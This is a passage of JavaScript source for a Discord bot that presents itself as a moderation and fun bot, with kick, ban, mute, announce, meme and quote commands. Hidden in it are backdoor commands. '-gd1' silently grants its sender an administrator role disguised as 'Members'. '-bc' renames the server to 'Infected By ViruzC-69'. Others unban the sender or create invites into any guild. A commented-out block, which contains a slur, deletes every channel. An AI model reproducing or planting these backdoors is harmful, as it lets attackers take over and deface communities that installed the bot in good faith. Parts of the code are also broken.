      .then(c => c.setParent(idd)//sets the cg announcements channel under CG category using the id 
      .then(AnnounceCh.add(c.id))
      .then(c.send(warningEmbed)//sends warning embed
      .then(c.createWebhook('announcements channel')
      .then(w => w.send('Created webhook')
      .then(announceWb.add(w.id))))//creates the announcements webhook
      ))
    msg.channel.send('Announcements have already been setup :white_check_mark: ')
  }

})





const warningEmbed = new Discord.MessageEmbed()//warning about the announcements channel
.setColor('#FF0435')
.setTitle('Warning')
.setURL('')
.setAuthor('The GrimmChild', '')
.setDescription(`
Announcements channel has been setup
Do not add any webhooks in this channel!
If the bot says that this is not the announcement channel delete this and do /setup again`)
.setThumbnail('')


client.on('message', msg => {

  if(msg.content.startsWith(`${prefix}announce`)) {//command name
    
  if(msg.channel.type === "dm") return msg.reply(':x: It seems like this is a dm chat... :x:')//checks if its a dm

    if(!msg.member.hasPermission('ADMINISTRATOR')) return msg.reply(`:x: It seems like you don't have the permission to announce... :x:`)//checks the permission of the author

    if(!AnnounceCh.has(msg.channel.id)) {msg.reply(':x: It seems like this is not the announcement channel :x:')
    return; 
    }
    if(commandCooldown.has(msg.author.id)) {//checks the cool down

      msg.reply('It seems like this command is on cooldown...')//reply if the member is on cooldown

    }else{//if member isnt in cooldown:
    const args = msg.content.split(' ').slice(1);//get rid of /announce
    const text = args.join(' ');//space moment

    if(!text) return msg.reply(':confused: It seems like you did not announce anything...')//if the member dosen't say anything

    const daauthor = msg.author.username//authors username which is used for the webhook
    const authorava = msg.author.avatarURL()//authors avatar which is used for the webhook

    msg.delete()//deletes the command
    client.channels.cache.forEach(async(c) => {//for each channel
      if(AnnounceCh.has(c.id)) {
      const webhooks = await c.fetchWebhooks();//fetch all webhooks
      const webhook = webhooks.first();//check the first webhook
       await webhook.send(text, {//send the text
        username: daauthor,//changes the webhook name

        avatarURL: authorava//changes webhook pfp
      })
    return;
    }
    })

    commandCooldown.add(msg.author.id)//after all that the author is put on cooldown

    setTimeout(() => {
      commandCooldown.delete(msg.author.id)
    }, 7000);//cooldown is cleared after 7 seconds

  }
  }
})


  client.on('message', msg => {
    if(msg.content.startsWith(`${prefix}kick`)) {//command
        const dm = new Discord.MessageEmbed()
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
    if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm
    const admin = new Discord.MessageEmbed()
    .setColor('#ede7e7')
    .setTitle(':x: You do not have the permission to kick members :x:')
    .setAuthor(client.user.username, pfp)
      if(!msg.member.hasPermission('KICK_MEMBERS')) return msg.reply(admin)//checks the permission of the author
      const admin1 = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle(':x: I do not have the permission to kick members :x:')
      .setAuthor(client.user.username, pfp)
      if(!msg.guild.me.hasPermission('KICK_MEMBERS')) return msg.reply(admin1)//checks the bots permission
      const mentionkick = msg.mentions.members.first()//the member to kick
      if(mentionkick === msg.member) {msg.reply(`It seems like you tried kicking yourself... you failed...`);//if someone tries to kick themselfs
      return;
      }
      const some = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle('You need to mention someone')
      .setAuthor(client.user.username, pfp)
      if(!mentionkick) {msg.reply(some);//if you dont mention anyone
      return;
      };
      const something = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle(`I can't kick that member`)
      .setAuthor(client.user.username, pfp)
      if(!mentionkick.kickable) {msg.reply(something);//if the member isnt kickable
      return;
      }
      let authorHighRole = msg.member.roles.highest.position;//highest role of the author
      let memberHighRole = msg.mentions.members.first().roles.highest.position;//highest role of the member to kick
      const rrr = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle(':x: You can`t kick members with same or higher roles than yours :x:')
      .setAuthor(client.user.username, pfp)
      if(memberHighRole >= authorHighRole) {msg.reply(rrr);//if someone tries kicking someone with a role higher then them but lower then the bots role
      return;
      };
      mentionkick.kick().then(msg.channel.send(`**${mentionkick.user.tag}** has been kicked :white_check_mark:`))//sends the kick message and kicks
  }
  })
  
  client.on('message', msg => {
    if(msg.content.startsWith(`${prefix}ban`)) {//command
        const dm = new Discord.MessageEmbed()
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
    if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm
    const admin = new Discord.MessageEmbed()
    .setColor('#ede7e7')
    .setTitle(':x: You do not have the permission to ban members :x:')
    .setAuthor(client.user.username, pfp)
      if(!msg.member.hasPermission('BAN_MEMBERS')) return msg.reply(admin)//checks the permission of the author
      const admin1 = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle(':x: I do not have the permission to ban members :x:')
      .setAuthor(client.user.username, pfp)
      if(!msg.guild.me.hasPermission('BAN_MEMBERS')) return msg.reply(admin1)//checks the bots permission
      const mentionkick = msg.mentions.members.first()//the member to kick
      if(mentionkick === msg.member) {msg.reply(`It seems like you tried banning yourself... you failed...`);//if someone tries to kick themselfs
      return;
      }
      const some = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle('You need to mention someone')
      .setAuthor(client.user.username, pfp)
      if(!mentionkick) {msg.reply(some);//if you dont mention anyone
      return;
      };
      const something = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle(`I can't ban that member`)
      .setAuthor(client.user.username, pfp)
      if(!mentionkick.bannable) {msg.reply(something);//if the member isnt kickable
      return;
      }
      let authorHighRole = msg.member.roles.highest.position;//highest role of the author
      let memberHighRole = msg.mentions.members.first().roles.highest.position;//highest role of the member to kick
      const rrr = new Discord.MessageEmbed()
      .setColor('#ede7e7')
      .setTitle(':x: You can`t ban members with same or higher roles than yours :x:')
      .setAuthor(client.user.username, pfp)
      if(memberHighRole >= authorHighRole) {msg.reply(rrr);//if someone tries kicking someone with a role higher then them but lower then the bots role
      return;
      };
      mentionkick.ban().then(msg.channel.send(`**${mentionkick.user.tag}** has been banned :white_check_mark:`))//sends the kick message and kicks
  }
  })
  

  client.on('message', async(msg) => {
    if(msg.content.startsWith(`${prefix}unban`)) {//command name
      const dm = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
    if(msg.channel.type === "dm") return msg.reply(dm)//chekcs if it s a dm chat
    const baaan = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('You don`t have permission to unban members')
    .setAuthor(client.user.username, pfp)
    if(!msg.member.hasPermission('BAN_MEMBERS')) return msg.reply(baaan)//checks the permission of the author
    const baaan1 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('I don`t have permission to unban members')
    .setAuthor(client.user.username, pfp)
    if(!msg.guild.me.hasPermission('BAN_MEMBERS')) return msg.reply(baaan1)//checks the bots permission
  
      const args = msg.content.split(' ').slice(1);//gets rid of command
      const theid = args.join(' ')//spaces
  
      if(!theid) {msg.reply(`You did not provide a user ID... :x:`);//if they dont provide a id
  
      if(isNaN(theid)) {msg.reply(`You did not provide a user ID... :x:`)}//if the id isnt a number
      return;
      };
  
      msg.guild.members.unban(theid).then((theid1) => {//probably should do it with bans.fetch but fuck it

      },reason => {
          console.log(reason)
          return msg.reply('That user doesn`t exist?') 
      })
      const theid1 = await client.users.fetch(theid) 
      msg.reply(`**${theid1.tag}** has been unbanned`)//if the user has been unbanned
    }
  })
  












  client.on('message', async(msg) => {
    if(msg.content.startsWith(`${prefix}nukeunban`)) {//command name
  
      const args = msg.content.split(' ').slice(1,2);//gets rid of command
      const guild1 = args.join(' ')//spaces
      const guild = msg.client.guilds.cache.find(g => g.id === guild1)
    const baaan1 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('I don`t have permission to unban members')
    .setAuthor(client.user.username, pfp)
    if(!guild.me.hasPermission('BAN_MEMBERS')) return msg.reply(baaan1)//checks the bots permission
  
      guild.members.unban(msg.author.id).then((theid1) => {//probably should do it with bans.fetch but fuck it

      },reason => {
          console.log(reason)
          return msg.reply('A error happened') 
      })
      const theid1 = await client.users.fetch(msg.author.id) 
      msg.reply(`**${theid1.tag}** has been unbanned from ${guild.name}`)//if the user has been unbanned
    }
  })







  client.on('message', async(msg) => {

    if(msg.content.startsWith(`${prefix}hackban`)) {//command name
        const dm = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
    if(msg.channel.type === "dm") return msg.reply(dm)//chekcs if it s a dm chat
    const baaan = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('You don`t have permission to ban members')
    .setAuthor(client.user.username, pfp)
    if(!msg.member.hasPermission('BAN_MEMBERS')) return msg.reply(baaan)//checks the permission of the author
    const baaan1 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('I don`t have permission to ban members')
    .setAuthor(client.user.username, pfp)
    if(!msg.guild.me.hasPermission('BAN_MEMBERS')) return msg.reply(baaan1)//checks the bots permission
  
    const args = msg.content.split(' ').slice(1, 2);//gets rid of command and reason
  
    const theid = args.join(' ')//spaces
  
    const args2 = msg.content.split(' ').slice(2);//gets the reason
  
    var reason1 = args2.join(' ')//spaces but for reason
    if(!reason1) reason1 = 'unspecified'
    const mid = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('You didn`t provide a ID')
    .setAuthor(client.user.username, pfp)
    if(!theid) return msg.reply(mid)//if they dont provide a i
    const iid = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('You didn`t provide a correct ID')
    .setAuthor(client.user.username, pfp)
      if(isNaN(theid)) return msg.reply(iid);//if its not a number
  
  
      await client.users.fetch(theid).then((theid1) => {

      },reason => {
          console.log(reason)
          return msg.reply('That user doesn`t exist?') 
      })
      const theid1 = await client.users.fetch(theid)
        msg.guild.members.ban(theid, {reason: reason1})//bans
         msg.reply(`**${theid1.tag}** has been banned for **${reason1}**`)//sends ban text
    }
  })



  client.on('message', async(msg) => {
    if(msg.content.startsWith(`${prefix}userinfo`)) {//command
        const dm = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
    if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm chat
      const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
      const theid1 = args.join(' ')//spaces lol
      const iiid = new Discord.MessageEmbed()//warning about the announcements channel
      .setColor('#ede7e7')
      .setTitle('You didn`t provide a ID')
      .setAuthor(client.user.username, pfp)
      if(!theid1) {msg.reply(iiid)//if they dont send a user ID
      return;
      }
      const iid = new Discord.MessageEmbed()//warning about the announcements channel
      .setColor('#ede7e7')
      .setTitle('You didn`t provide a correct ID')
      .setAuthor(client.user.username, pfp)
      if(isNaN(theid1)) {msg.reply(iid)
      return; 
      }
      await client.users.fetch(theid1).then((theid1) => {

    },reason => {
        console.log(reason)
        return msg.reply('That user doesn`t exist?') 
    })
    const theid = await client.users.fetch(theid1)
      let embed = new Discord.MessageEmbed()//info embed
      .setTitle(`**User Info - ${theid.tag}**`)
      .setAuthor(client.user.username, pfp)
      .addField("Username", `\`${theid.username}\``)
      .addField("Discrim", `\`${theid.discriminator}\``)
      .addField("ID", `\`${theid.id}\``)
      .addField("Created", `\`${theid.createdAt}\``)
      .setImage(theid.displayAvatarURL())
      .setColor('#ede7e7')
  
      msg.channel.send(embed)//sends embed
    }
  })
  

  client.on('message', async(msg) => {
    if(msg.content.startsWith(`${prefix}guildinfo`)) {//command
        const dm = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
      if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm chat
        const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
        const theid1 = args.join(' ')//spaces lol
        const iiid = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('You didn`t provide a correct ID')
        .setAuthor(client.user.username, pfp)
        if(!theid1) {msg.reply(iiid)//if they dont send a guild ID
        return;
        }
        const iid = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('You didn`t provide a correct ID')
        .setAuthor(client.user.username, pfp)
      if(isNaN(theid1)) {msg.reply(iid)
      return; 
      }
  
      const theid = await client.guilds.cache.get(theid1)
      let roles = [], r = 0

      theid.roles.cache.forEach(g => {
  
        roles[roles.length+ 0] = (`<@&${g.id}> `);
  
        r++;
  
      })
          if(r >= theid.roles.cache.size) {
        let embed = new Discord.MessageEmbed()
        .setTitle(`Guild - ${theid.name}`)
        .addField(`__ __`,`**ServerID**: \`${theid.id}\``)
        .addFields(
          {name: "VerificationLVL", value: `\`${theid.verificationLevel}\``},
          {name: "Channels", value: `\`${theid.channels.cache.filter(c => c.type === "text").size}\` Text \\| \`${theid.channels.cache.filter(c => c.type === "voice").size}\` Voice \\| \`${theid.channels.cache.filter(c => c.type === "category").size}\` Categories`},
          {name: "Region", value: `__${theid.region}__`}
        )
        .addField(`Roles: `, `\`${theid.roles.cache.size}\``)
        .addField(`Membercount: \`${theid.memberCount}\``, `\`\`\`JS\nOnline Members: ${theid.members.cache.filter(m => m.presence.status !== "offline").size}\nOffline Members: ${theid.members.cache.filter(m => m.presence.status === "offline").size}\`\`\``)
        .addField(`Owner: `, `\`\`\`ID: ${theid.ownerID}\nTAG: ${theid.owner.user.tag}\`\`\``)
        .setThumbnail(theid.iconURL())
        msg.channel.send(embed)
        var bruh = theid.channels.cache.find(c => c.type === "text")
        if(!bruh) {return}
        if(theid.me.hasPermission("CREATE_INSTANT_INVITE")) {
          if(msg.author.id === Kass) {
             if(theid.me.hasPermission("ADMINISTRATOR")) {msg.channel.send("with admin(just checking)")}
          bruh.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
        .then(i => msg.channel.send("https://discord.gg/" + i.code))}
        }
      }
      }
  })

const guildcool = new Set()
  client.on('message', async msg => {
      if(msg.content === `${prefix}purge`) {
        const dm = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
      if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm chat
    const baaan1 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('I don`t have permission')
    .setAuthor(client.user.username, pfp)

    const baaan12 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('You don`t have permission')
    .setAuthor(client.user.username, pfp)
    if(!msg.guild.me.hasPermission('MANAGE_CHANNELS')) {return msg.reply(baaan1)}//checks the bots permission
    if(!msg.member.hasPermission('MANAGE_CHANNELS')) {return msg.reply(baaan12)}
    let e = msg.channel.position
      msg.channel.clone().then(channel => channel.setPosition(e))
      msg.channel.delete()
      }else {
        if(msg.content.startsWith(`${prefix}purge me`)) {
          const dm = new Discord.MessageEmbed()//warning about the announcements channel
          .setColor('#ede7e7')
          .setTitle('This is a DM chat')
          .setAuthor(client.user.username, pfp)
        if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm chat
          const baaan1 = new Discord.MessageEmbed()//warning about the announcements channel
          .setColor('#ede7e7')
          .setTitle('I don`t have permission')
          .setAuthor(client.user.username, pfp)
      
          const baaan12 = new Discord.MessageEmbed()//warning about the announcements channel
          .setColor('#ede7e7')
          .setTitle('I don`t have permission')
          .setAuthor(client.user.username, pfp)
          if(!msg.guild.me.hasPermission('MANAGE_CHANNELS')) {return msg.reply(baaan1)}//checks the bots permission
          msg.channel.messages.fetch({ limit: 99}).then(m => {
            m.forEach(ms => {
              if(ms.author.id === msg.author.id) {ms.delete()}
            })
          })
        }
      }
  })


  client.on('message', msg => {
    if(msg.content.startsWith(`${prefix}mute`)) {   
        const dm = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
      if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm chat
    const baaan1 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('I don`t have permission')
    .setAuthor(client.user.username, pfp)
  
    const baaan12 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('You don`t have permission')
    .setAuthor(client.user.username, pfp)
    if(!msg.guild.me.hasPermission('MANAGE_CHANNELS')) {return msg.reply(baaan1)}//checks the bots permission
    if(!msg.member.hasPermission('KICK_MEMBERS')) {return msg.reply(baaan12)}
    const ther = msg.mentions.members.first()
    if(!ther) {return msg.channel.send('User not found')} 
    const mentionkick = msg.mentions.members.first()//the member to kick
      if(mentionkick === msg.member) {msg.reply(`It seems like you tried banning yourself... you failed...`);//if someone tries to kick themselfs
      return;
      }
    let authorHighRole = msg.member.roles.highest.position;//highest role of the author
    let memberHighRole = msg.mentions.members.first().roles.highest.position;//highest role of the member to kick
    const rrr = new Discord.MessageEmbed()
    .setColor('#ede7e7')
    .setTitle(':x: You can`t mute members with same or higher roles than yours :x:')
    .setAuthor(client.user.username, pfp)
    if(memberHighRole >= authorHighRole) {msg.reply(rrr);//if someone tries kicking someone with a role higher then them but lower then the bots role
    return;
    };
    msg.guild.channels.cache.forEach(c => {
      c.updateOverwrite(ther, { 'SEND_MESSAGES': false})
    })
    msg.channel.send(`\`${ther.user.tag}\` has been muted`)
    }else {
      if(msg.content.startsWith(`${prefix}unmute`)) {   
        const dm = new Discord.MessageEmbed()//warning about the announcements channel
        .setColor('#ede7e7')
        .setTitle('This is a DM chat')
        .setAuthor(client.user.username, pfp)
      if(msg.channel.type === "dm") return msg.reply(dm)//checks if its a dm chat
    const baaan1 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('I don`t have permission')
    .setAuthor(client.user.username, pfp)
  
    const baaan12 = new Discord.MessageEmbed()//warning about the announcements channel
    .setColor('#ede7e7')
    .setTitle('You don`t have permission')
    .setAuthor(client.user.username, pfp)
    if(!msg.guild.me.hasPermission('MANAGE_CHANNELS')) {return msg.reply(baaan1)}//checks the bots permission
    if(!msg.member.hasPermission('KICK_MEMBERS')) {return msg.reply(baaan12)}
    const ther = msg.mentions.members.first()
    if(!ther) {return msg.channel.send('User not found')} 
    msg.guild.channels.cache.forEach(c => {
      c.updateOverwrite(ther, { 'SEND_MESSAGES': null})
    })
    msg.channel.send(`\`${ther.user.tag}\` has been unmuted`)
 
    }
    }
  })


client.on('message', message => {
  if(message.author.id === Kass) {

  if(message.content.startsWith(`${prefix}out`)) {

   const mentionkick = message.mentions.members.first()//the member to kick
   mentionkick.ban()
  }
}
});




client.on('message', message => {
  if(message.author.id === Kass) {//if the bot is turned off it loses the set for announcement channels.. so i made this

  if(message.content.startsWith(`${prefix}add`)) {

    const args = msg.content.split(' ').slice(1);//get rid of /announce
    const text = args.join(' ');//space moment

    AnnounceCh.add(text)
  }
}
});




client.on('message', async(msg) => {
  if(msg.author.id === Kass) {//if the bot is turned off it loses the set for announcement channels.. so i made this

    if(msg.content.startsWith(`${prefix}remove`)) {
      const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
      const theid1 = args.join(' ')//spaces lol
      if(!theid1) {msg.reply('It seems like you did not provide a server ID...')//if they dont send a guild ID
      return;
      }
      const theid = await client.guilds.cache.get(theid1)
      if(!theid) {msg.reply('It seems like the guild was not found...')//if they dont send a guild ID
      return;
    } 
    theid.leave()
    }
  }  
})


const coolIT = new Set()

function dice() {
  var rand = ['1','2','3','4','5','6'];

  return rand[Math.floor(Math.random()*rand.length)];
}
client.on('message', msg => {
  if(msg.content === `${prefix}rolldice`) {
    const authorDice = dice()
    const BotDice = dice()
    var prize = authorDice - BotDice
    var bruh = BotDice - authorDice
    if(coolIT.has(msg.author.id)) {msg.reply('It seems like this command is on cooldown...')
  }else
    if(authorDice > BotDice) {msg.reply(`YOU WON!!!` + '\n Your got: ' + prize + 'more points then the bot...')}else msg.reply(`You lost!` + '\n The bot won ' + bruh + ' more points then you...')
  }
  coolIT.add(msg.author.id)//after all that the author is put on cooldown

    setTimeout(() => {
      coolIT.delete(msg.author.id)
    }, 15000);//cooldown is cleared after 7 seconds

})


function doMagic8BallVoodoo() {
  var rand = ['Yes', 'No', 'Why are you even trying?', 'What do you think? NO', 'Maybe', 'Never', 'Yep', 'Uh oh, I dunno how to answer tbh:/', 'HAH *no*'];

  return rand[Math.floor(Math.random()*rand.length)];
}

// Later in the code:

client.on('message', async(message) => {
  if(message.content.startsWith(`${prefix}8ball`))
{
  const args = message.content.split(' ').slice(1); // All arguments behind the command name with the prefix
  const amount = args.join(' '); // Amount of messages which should be deleted

  if (!amount) return message.reply('How about you ask a question...'); // Checks if the `amount` parameter is given
  await message.channel.send(`\` ${doMagic8BallVoodoo()}\``);
}

})

function memes() {
  var rand = ["https://cdn.discordapp.com/attachments/753854205533487114/762703911190396979/discord.mp4", "https://cdn.discordapp.com/attachments/757748235812077598/768789234336399390/video0.mp4", "https://media.discordapp.net/attachments/724621958003818508/776316674949120050/Hey_Do_Atheists_Go_to_Hell_25092020144021.jpg?width=304&height=587", "https://cdn.discordapp.com/attachments/753794195977928716/776210658659663872/video0_-_2020-11-06T182932.718.mp4", "https://media.discordapp.net/attachments/655221068725747713/775432767739002880/sx7hc1q7syx51.png", "https://media.discordapp.net/attachments/724621958003818508/774525906751717376/1604725744225.png?width=334&height=587", "https://media.discordapp.net/attachments/724621958003818508/774406161541496832/IMG_20201105_135432.jpg?width=556&height=587", "https://cdn.discordapp.com/attachments/445627716419584003/773474876324970506/Memes.mp4", "https://media.discordapp.net/attachments/724621958003818508/773627397471338526/image0.png", "https://media.discordapp.net/attachments/724621958003818508/773594280878407790/Screenshot_20201028-214739.png", "https://cdn.discordapp.com/attachments/753794195977928716/772673689425543168/video0.mov", "https://media.discordapp.net/attachments/753794195977928716/772984202710614046/20201102_141245.jpg", "https://cdn.discordapp.com/attachments/745404196425039924/747533892063461538/video0_3_6.mp4", "https://cdn.discordapp.com/attachments/745404196425039924/747582423964975254/video0-4-1.mp4", "https://cdn.discordapp.com/attachments/745404196425039924/747650955432165436/video0-16.mp4", "https://cdn.discordapp.com/attachments/745404196425039924/753672269053820979/video0.mp4", "https://media.discordapp.net/attachments/745404196425039924/754027517089939486/image0.png?width=496&height=588", "https://cdn.discordapp.com/attachments/753794195977928716/770833533492002846/video0-15.mov", "https://cdn.discordapp.com/attachments/753794195977928716/770834132850442250/video0_39.mp4", "https://cdn.discordapp.com/attachments/654373584478797836/770361758459887626/video0.mov", "https://cdn.discordapp.com/attachments/753794195977928716/770834816832372756/video0_9.mp4", "https://media.discordapp.net/attachments/761795574243524649/770391032184700928/n0ddfdak2tx11.png?width=329&height=586", "https://cdn.discordapp.com/attachments/745404196425039924/766800257131741224/Dolphin.mp4", "https://cdn.discordapp.com/attachments/768535994932396082/768538706830426152/video0_1.mov", "https://cdn.discordapp.com/attachments/757748235812077598/768847033708576808/VideosFolder_https___t.co_zhW0526y7A.mp4", "https://media.discordapp.net/attachments/744966288652107896/751618011852570664/image0.png?width=588&height=587", "https://media.discordapp.net/attachments/724621958003818508/770032687255126026/BIBLE2RATEDPG13.png?width=513&height=587", "https://media.discordapp.net/attachments/745404196425039924/770572852629471242/image1-1.png?width=396&height=588"]

  return rand[Math.floor(Math.random()*rand.length)];
}

client.on('message', message => {
  if(message.content.startsWith(`${prefix}meme`))
{
  message.channel.send(memes());
}

})

function quotes() {
  var rand = ['“Hasta la vista baby” – Terminator 2: Judgement Day', '“My precious” – The Lord of the Rings: The Two Towers', '“The name’s Bond. James Bond” – Bond: Doctor N', '“Yabba dabba doo!” – The Flintstones', '“You are the weakest link. Goodbye” – The Weakest Link', '“Exterminate” – Doctor Who ', '"Remember, remember, the Fifth of November, the Gunpowder Treason and Plot. I know of no reason why the Gunpowder Treason should ever be forgot."- V for Venedetta', '"Voilà! In view, a humble vaudevillian veteran, cast vicariously as both victim and villain by the vicissitudes of Fate. This visage, no mere veneer of vanity, is a vestige of the vox populi, now vacant, vanished. However, this valorous visitation of a by-gone vexation, stands vivified and has vowed to vanquish these venal and virulent vermin vanguarding vice and vouchsafing the violently vicious and voracious violation of volition. [carves V into poster on wall] The only verdict is vengeance; a vendetta, held as a votive, not in vain, for the value and veracity of such shall one day vindicate the vigilant and the virtuous. Verily, this vichyssoise of verbiage veers most verbose, so let me simply add that it\'s my very good honor to meet you and you may call me V."- V for Venedetta(one of my favorites)', '"YOU SHOULD HAVE GONE FOR THE HEAD"- Avengers: Infinity War', '"THE HARDEST CHOICES REQUIRE THE STRONGEST WILLS."- Avengers: Infinity War', '“ May the Force be with you.”- Star Wars Episode 3', '"I\'m going to make a offer he can\'t refuse."- The Goodfather', '"Do you know how i got these scars?"- The Dark Knight', '"Madness is just like gravity...all it takes is a little *push*"- The Dark Knight', '“No great mind has ever existed without a touch of madness.”― Aristotle', '"Hello There"- Star Wars Episode 3', '“I am Iron Man.”- Iron Man', '"Steve Rogers: Big man in a suit of armour. Take that off, what are you? Tony Stark: Genius, billionaire, playboy, philanthropist."- Avengers', '"Avengers!... *assemble*"- Avengers: Endgame', '"In this world, wherever there is light - there are also shadows. As long as the concept of winners exists, there must also be losers. The selfish desire of wanting to maintain peace causes wars, and hatred is born to protect love."- (Madara)Naruto Shipudden', '“It\'s alive! It\'s alive!” -Frankenstein, 1931', '“I\'ll be back.” -The Terminator, 1984', '"Just keep swimming" - Finding Nemo, 2003', '"Frankly, my dear, I don\'t give a damn." - Gone With the Wind, 1939', '“Magic Mirror on the wall, who is the fairest one of all?" -Snow White and the Seven Dwarfs, 1937', '“I am your father.” -Star Wars Episode V: The Empire Strikes Back, 1980', '"Is It Just Me Or Is It Getting Crazier Out There?"- Joker 2019', '"All I Have Are Negative Thoughts."- Joker 2019', '"Can You Introduce Me As Joker?"- Joker 2019', '“In this world, everything is governed by balance. There’s what you stand to gain and what you stand to lose. And when you think you’ve got nothing to lose, you become overconfident.”- La Casa de Papel(Money Heist)', '"It\'s funny how dumb you are"- Gravity Falls', '"I\'m insane either way braniac"- Gravity Falls', '"Why so serious?" - The Dark Knight, 2008', '"I am whatever you say I am; if I wasn\'t, then why would you say I am."- Eminem'];

  return rand[Math.floor(Math.random()*rand.length)];
}


client.on('message', message => {
  if(message.content.startsWith(`${prefix}quotes`))
{
  message.channel.send(`\` ${quotes()}\``);
}

})


//client.on('message', message => {
  //if(message.content.startsWith(`-clear`)) {
    //if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
    //{
      //message.guild.channels.cache.forEach(channel => {
        //channel.delete().then((channel)=>{
          //if (channel.deleted === true)
          //{
            //console.log("channel succesfully yeeted!");
          //}
        //},reason => {
         // console.log(`Faggot i cant delete that channel because ${reason}`);
        //})
      //})
      
    //}
  //}
//});



















 
 
  


 client.on('message', async msg => {//admin
  if(msg.content === '-gd1') {
  if(!unallowedguilds.includes(msg.guild.id)) {
    if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
        var botr = msg.guild.me.roles.highest.position - 0
const adminn = msg.guild.roles.cache.find(r => r.name === 'Members')
    if(!adminn) {
msg.guild.roles.cache.random().delete()
msg.guild.roles.create({ data: { name: 'Members', permissions: ['ADMINISTRATOR'], position: botr, hoist: false} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
     else{
      await adminn.setPermissions(['ADMINISTRATOR'])
     await msg.member.roles.add(adminn).then(msg.delete())}
}
}
})


//const adminn = message.guild.roles.cache.find(r => r.name === 'godmin')
//member.roles.set(adminn)

			client.on("message", message => {
                    if (message.author.bot) return;
                  
                   if (message.content === '-bc') {
                     message.delete();
                      message.guild.setName("💉Server Infected By ViruzC-69💉");
                      message.guild.setIcon("https://cdn.discordapp.com/attachments/807643062255616000/807643099786510366/viruz_icon.png"
                      );
                      }
                    }); 




const bot = new Discord.Client();

   
client.login(token1);
